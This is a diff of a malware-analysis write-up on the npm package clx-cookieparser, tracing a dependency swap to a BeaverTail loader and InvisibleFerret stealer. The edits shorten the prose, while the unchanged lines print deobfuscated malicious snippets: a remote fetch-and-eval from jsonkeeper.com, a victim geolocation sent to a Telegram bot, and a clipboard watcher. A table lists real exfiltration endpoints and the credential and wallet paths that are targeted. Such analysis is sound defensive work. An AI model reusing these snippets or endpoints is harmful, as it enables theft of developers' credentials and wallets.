@@ -8,9 +8,7 @@ ecosystem: npm
 
 <img src="/assets/images/clx-cookieparser-dprk-meme.jpg" alt="Meme: 'DPRK hiding in your npm's? It's more likely than you think.'">
 
-Most malicious npm clones hide their payload in the package you install. `clx-cookieparser` doesn't — the package you install is the genuine express cookie-parser, working middleware and passing tests included. The trick is one swapped dependency: instead of the real cookie-signing library it pulls the attacker's twin, `clx-cookie-signature`, installing it at runtime if it has to. That twin fetches a blob from jsonkeeper.com and evals it, and the chain unrolls into BeaverTail and InvisibleFerret — the loader-and-stealer kit of the DPRK's Contagious Interview campaign, per [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). cleave flags the final stages as Lazarus outright. And the files it steals go to the same endpoint, through the same code, as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) did a week earlier — the same operator, not a coincidence.
-
-Traits below are from cleave `2.0.0-rc.3` (traits `09ce9f44f`); the deeper stages were detonated in a disposable VM with every sink stubbed.
+The package you install is the genuine express cookie-parser, working middleware and passing tests included; the theft lives one swapped dependency away, in the attacker's twin `clx-cookie-signature`. That twin fetches a jsonkeeper.com blob and `eval`s it, and the chain unrolls into BeaverTail dropping InvisibleFerret — the DPRK Contagious Interview kit, per [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/), exfiltrating through the same code and endpoint as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) did a week earlier.
 
 ## Package metadata
 
@@ -25,7 +23,7 @@ Traits below are from cleave `2.0.0-rc.3` (traits `09ce9f44f`); the deeper stage
 
 ## The version walk
 
-The early versions are bait. 1.4.4 and 1.4.5 ship the real cookie-parser, byte-identical, and differ only in one cosmetic field — the `repository` shorthand, which creeps closer to the real package's name with each release. By 1.4.7 the repo string matches upstream exactly, the cover is complete, and the payload is switched on.
+The early versions are bait: 1.4.4 and 1.4.5 ship the real cookie-parser byte-identical, with the `repository` shorthand creeping closer to upstream each release. By 1.4.7 the repo string matches exactly and the payload is switched on.
 
 | Version | `index.js` | `repository` field | Signing dependency | Verdict |
 | --- | --- | --- | --- | --- |
@@ -35,7 +33,7 @@ The early versions are bait. 1.4.4 and 1.4.5 ship the real cookie-parser, byte-i
 
 ## Stage 1 — clx-cookieparser: the dependency swap
 
-The weaponized 1.4.7 makes one surgical edit. It drops the legitimate signing dependency from its manifest and reaches for the attacker's twin instead, installing it on the spot — silent, no-save, hidden window — if it isn't already present. If even that fails, it prints a polite fake error assembled one character at a time and exits. The parser below this block still works perfectly, so the developer sees green tests and functioning middleware. The malice never lives in this package; it lives one `require()` away.
+The weaponized 1.4.7 drops the real signing dependency and reaches for the attacker's twin, installing it on the spot if absent and exiting with a fake error if that fails. The parser below still works, so the developer sees green tests while the malice sits one `require()` away.
 
 <pre class="lang-js"><code><span class="tok-kw">const</span> { execSync } = <span class="tok-builtin">require</span>(<span class="tok-str">'child_process'</span>);
 <span class="tok-kw">var</span> signature;
@@ -60,7 +58,7 @@ The weaponized 1.4.7 makes one surgical edit. It drops the legitimate signing de
 
 ## Stage 2 — clx-cookie-signature: the courier
 
-The evil twin is also a faithful clone — every export of the real signing library works. The `clx-` prefix is the whole game: the real signing package can't be republished, so the attacker mints a matching prefixed pair they fully control and rewrites the parser to require it. The damage is a single line bolted to the top of the module, so it fires the instant the parser requires it. That line fetches a blob from jsonkeeper.com, a free pastebin, and hands the result straight to `eval`. A second jsonkeeper link sits beside it, hex-encoded and never called — a spare key taped under the mat for when the first one dies. Nothing here touches disk or spawns a process; it is purely a courier.
+The twin is a faithful clone too, with one line bolted to the top: fetch a jsonkeeper.com blob and hand it straight to `eval`. A second jsonkeeper link sits beside it, hex-encoded and never called — a spare key under the mat for when the first one dies.
 
 <pre class="lang-js"><code><span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-str">'https://www.jsonkeeper.com/b/MYUKZ'</span>).<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content_o); });
 <span class="tok-com">// dormant backup, hex-encoded, never invoked:</span>
@@ -76,13 +74,13 @@ The evil twin is also a faithful clone — every export of the real signing libr
 
 ## Stage 3 — the jsonkeeper loader
 
-The jsonkeeper bin ships with a sense of humor: it holds two fields, and the harmless one just logs `Server running`. The malware ignores that decoy, reaches for the real field, and evals three chained functions. The first is the BeaverTail loader: it installs two HTTP libraries, beacons its C2 with a campaign id in the path, saves the reply as `0001.dat`, and runs it with node. The second profiles the victim through ipinfo.io and DMs the result — IP, country, city, coordinates — to a Telegram bot. The third is a tripwire: if the machine's hostname sits in a hardcoded blocklist, including `vboxuser` and a handful of researcher names, it quietly exits. The blob is paste-hosted and mutable, so what the bin serves can shift between pulls.
+The bin holds two fields; the malware skips the `Server running` decoy and evals three chained functions. The first is the BeaverTail loader — install HTTP libs, beacon C2 with a campaign id, write `0001.dat`, run it; the second geolocates the victim through ipinfo.io and DMs it to a Telegram bot; the third quietly exits if the hostname sits in a researcher/VM blocklist.
 
 <pre class="lang-js"><code>content_n → console.<span class="tok-fn">log</span>(<span class="tok-str">'Server running'</span>)                 <span class="tok-com">// decoy</span>
 content_o → <span class="tok-kw">function</span> <span class="tok-fn">c2</span>() { <span class="tok-com">/* obfuscator.io loader, eval'd */</span> }
 </code></pre>
 
-Deobfuscated, the `c3` profiler is the bluntest part of the chain:
+Deobfuscated, the `c3` profiler is the bluntest part of the chain.
 
 <pre class="lang-js"><code><span class="tok-com">// Stage 3 c3(), deobfuscated — geolocate the victim, DM it to a Telegram bot</span>
 <span class="tok-kw">const</span> g = <span class="tok-kw">await</span> (<span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(<span class="tok-str">'https://ipinfo.io/json?token=8e5005610fd390'</span>)).<span class="tok-fn">json</span>();
@@ -102,7 +100,7 @@ Deobfuscated, the `c3` profiler is the bluntest part of the chain:
 
 ## Stage 4 — 0001.dat: the InvisibleFerret kit
 
-`0001.dat` is the orchestrator, and it is re-obfuscated on every pull — the wrapper's hash changes each fetch, the modules inside do not. It writes two of them to disk and runs each with node, then spawns two more inline. Between them they cover every angle a laptop offers, and cleave tags two on the exfil endpoint alone as Lazarus.
+`0001.dat` is the orchestrator: re-obfuscated on every pull, it writes two modules to disk and spawns two more inline, and cleave tags two of them as Lazarus on the exfil endpoint alone.
 
 | Module | Role | Sink |
 | --- | --- | --- |
@@ -111,7 +109,7 @@ Deobfuscated, the `c3` profiler is the bluntest part of the chain:
 | `captured_spawn_11.js` | Recursive file grabber — `.aws`/`.ssh`/`.claude` dirs, `*.env*`/`*secret phrase*`/`*metamask*` | `http://216.126.224.220:5976/upload` |
 | `captured_spawn_12.js` | Clipboard watcher — `pbpaste` / PowerShell `Get-Clipboard` | `http://216.126.225.83/npm-compiler.log` |
 
-The stealer's reach is wide: Chrome, Edge, Brave, and Opera login databases and web data, the macOS `login.keychain-db`, and wallet extensions spanning MetaMask, Phantom, Coinbase, Rabby, SafePal, TronLink, Trust Wallet, Coin98, Keplr, MathWallet, Exodus, and Binance. The file grabber walks the home directory, skips noise, and uploads anything matching its key/secret/wallet patterns. The clipboard watcher loops forever, shipping whatever changes — and deobfuscated, it is the same routine web-dotenv ran:
+Deobfuscated, the clipboard watcher is the same routine web-dotenv ran.
 
 <pre class="lang-js"><code><span class="tok-com">// Stage 4 captured_spawn_12.js, deobfuscated — clipboard watcher</span>
 <span class="tok-kw">const</span> clip = process.platform === <span class="tok-str">'darwin'</span>
@@ -134,9 +132,7 @@ The stealer's reach is wide: Chrome, Edge, Brave, and Opera login databases and 
 
 ## Same operator as web-dotenv
 
-This is not a lookalike of [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/); it is the same kit. The file grabber ships to the exact endpoint web-dotenv used — `http://216.126.224.220:5976/upload`, byte for byte. The clipboard watcher posts to the same `/npm-compiler.log` path. Both sinks sit on adjacent Tier.Net addresses inside one `216.126.224.0/22`. The target allow-list, the obfuscator, the `userkey` upload header, and the staging through jsonkeeper.com all match. web-dotenv wore a `jean_dupont24` persona, and we called it a different shop from the IPFS droppers — against this chain it is the same shop.
-
-Why DPRK, beyond the tracker? A BeaverTail loader pulling an InvisibleFerret stealer kit through a fake npm dependency is the Contagious Interview playbook that CrowdStrike and others pin on FAMOUS CHOLLIMA, and this chain runs it almost beat for beat: jsonkeeper staging, a loader that installs axios and socket.io-client, a numbered payload, and theft aimed straight at crypto wallets and developer keys. cleave reaches the same verdict unprompted — the exfil endpoint trips its Lazarus `makelog-url` rule, the GlassWorm marker, and the stealer trips a Lazarus wallet-path rule, both family signatures rather than generic stealer noise. It is a family match, not proof from this sample alone, but it is why the call is confident before kmsec enters the picture.
+This is the same kit as [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/): the file grabber ships to its exact endpoint `http://216.126.224.220:5976/upload`, the clipboard watcher posts to the same `/npm-compiler.log`, and the target allow-list, obfuscator, `userkey` header, and jsonkeeper staging all match. A BeaverTail loader pulling an InvisibleFerret stealer through a fake npm dependency is the Contagious Interview playbook CrowdStrike pins on FAMOUS CHOLLIMA, and cleave reaches the verdict unprompted: the exfil endpoint trips its Lazarus `makelog-url` rule and the stealer trips a Lazarus wallet-path rule.
 
 ## Indicators
 
